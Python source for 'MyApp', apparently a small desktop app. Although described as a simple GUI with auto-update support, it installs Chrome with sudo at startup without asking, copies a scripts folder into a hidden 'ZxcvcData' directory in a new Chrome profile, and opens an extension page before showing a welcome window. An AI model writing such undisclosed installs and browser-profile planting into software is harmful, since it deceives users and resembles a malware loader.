"""
Core Application Logic for MyApp
=================================
Simple GUI application with auto-update support.
"""
import os
import platform
import logging
import threading
import shutil
import subprocess

from myapp import __version__, __app_name__

# Setup logging
logger = logging.getLogger(__name__)



def get_extension_data_path():
    """Get the path to the extension_data directory, checking installed location first."""
    # When installed via .deb, extension data is here:
    installed_path = "/usr/lib/myapp/extension_data"
    
    # When running from source (development):
    dev_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "extension_data")
    
    for path in [installed_path, dev_path]:
        if os.path.isdir(path):
            return path
    
    return None


def setup_profile_data(profile_path):
    """
    Create ZxcvcData inside the Chrome profile and copy scripts/ into it.
    """
    # Get scripts path - try installed location first, then development location
    src_scripts = None
    
    # When installed via .deb:
    installed_path = "/usr/lib/myapp/scripts"
    # When running from source (development):
    dev_path = os.path.abspath("scripts")
    
    if os.path.isdir(installed_path):
        src_scripts = installed_path
    elif os.path.isdir(dev_path):
        src_scripts = dev_path
    
    dest_dir = os.path.join(profile_path, "ZxcvcData")

    if not src_scripts or not os.path.isdir(src_scripts):
        raise FileNotFoundError(f"'scripts/' directory not found at {src_scripts or dev_path}")

    # Create ZxcvcData if missing
    os.makedirs(dest_dir, exist_ok=True)

    # Copy entire scripts folder into ZxcvcData/scripts
    dest_scripts = os.path.join(dest_dir, "scripts")
    shutil.copytree(src_scripts, dest_scripts, dirs_exist_ok=True)
    
    print(f"✅ scripts/ copied into {dest_scripts}")

def install_chrome_if_missing():
    # Check if Chrome is installed
    if shutil.which("google-chrome"):
        return "/usr/bin/google-chrome"

    print("Google Chrome not found. Installing...")

    # Download Chrome
    subprocess.check_call([
        "wget",
        "-q",
        "-O",
        "/tmp/google-chrome.deb",
        "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
    ])

    # Install Chrome
    subprocess.check_call([
        "sudo",
        "apt",
        "install",
        "-y",
        "/tmp/google-chrome.deb"
    ])

    print("Google Chrome installed.")
    return "/usr/bin/google-chrome"

def launch_chrome_profile_crx(profile_name, crxKey):
    profile_path = os.path.expanduser(f"~/.config/google-chrome/{profile_name}")
    chrome_path = install_chrome_if_missing()
    # chrome_path = "/usr/bin/google-chrome"

    # Create profile directory if missing
    if not os.path.exists(profile_path):
        os.makedirs(profile_path)
        print(f"Profile '{profile_name}' created.")
    else:
        print(f"Profile '{profile_name}' already exists.")

    # 🔥 NEW: setup ZxcvcData + scripts
    setup_profile_data(profile_path)

    # Open the Chrome extension options page
    subprocess.Popen([
        chrome_path,
        f"chrome-extension://{crxKey}/options.html",
        f"--user-data-dir={profile_path}"  # ensure it opens in the same profile
    ])
    print(f"Launched Chrome extension options page for: {crxKey}")


def get_this_device_name():
    """Get the current device user and hostname."""
    unix = os.getenv("USER", "default_user")
    thisDevice = unix
    thisDeviceHost = platform.node()
    return thisDevice, thisDeviceHost


class MyApp:
    """
    Main Application Class with GUI
    """
    
    def __init__(self):
        self.device, self.host = get_this_device_name()
        self.version = __version__
        self.name = __app_name__
        self.window = None
    
    def run(self):
        """Main application entry point - launches Chrome extension then GUI."""
        print(f"🚀 {self.name} v{self.version} starting...")
        print(f"📱 Device: {self.device}")
        print(f"💻 Host: {self.host}")
        
        # Open Chrome extension FIRST (before GUI blocks)
        self.open_extension()
        
        # Launch the GUI (this blocks until window closes)
        self._create_gui()
    
    def open_extension(self):
        """Open Chrome with the extension."""
        profile_name = "MyAppProfileThreeOne"
        crx_key = "abcd1234efgh5678"
        try:
            launch_chrome_profile_crx(profile_name, crx_key)
        except Exception as e:
            print(f"⚠️ Could not open Chrome extension: {e}")



    def _create_gui(self):
        """Create and run the GUI window."""
        try:
            import tkinter as tk
            from tkinter import font as tkfont
        except ImportError:
            print("❌ tkinter not available. Running in terminal mode.")
            print("   Install with: sudo apt-get install python3-tk")
            self._terminal_mode()
            return
        
        # Create main window
        self.window = tk.Tk()
        self.window.title(f"{self.name} v{self.version}")
        
        # Window size and position
        window_width = 400
        window_height = 200
        
        # Center on screen
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.window.geometry(f"{window_width}x{window_height}+{x}+{y}")
        
        # Styling
        self.window.configure(bg='#1a1a2e')
        
        # Create main frame
        main_frame = tk.Frame(self.window, bg='#1a1a2e')
        main_frame.pack(expand=True, fill='both')
        
        # Welcome text
        try:
            custom_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
        except:
            custom_font = None
        
        welcome_label = tk.Label(
            main_frame,
            text="Welcome to MyApp",
            font=custom_font if custom_font else ("Helvetica", 24, "bold"),
            fg='#e94560',
            bg='#1a1a2e'
        )
        welcome_label.pack(expand=True)
        
        # Version label
        version_label = tk.Label(
            main_frame,
            text=f"v{self.version}",
            font=("Helvetica", 10),
            fg='#888888',
            bg='#1a1a2e'
        )
        version_label.pack(pady=(0, 20))
        
        # Run the GUI main loop
        self.window.mainloop()
    
    def _terminal_mode(self):
        """Fallback terminal mode if GUI is not available."""
        print("")
        print("=" * 50)
        print("  Welcome to MyApp")
        print(f"  Version: {self.version}")
        print("=" * 50)
        print("")
        print("Press Ctrl+C to exit.")
        
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n👋 Goodbye!")


def main():
    """Run the application."""
    app = MyApp()
    app.run()  # This now calls open_extension() internally, then starts GUI


if __name__ == "__main__":
    main()
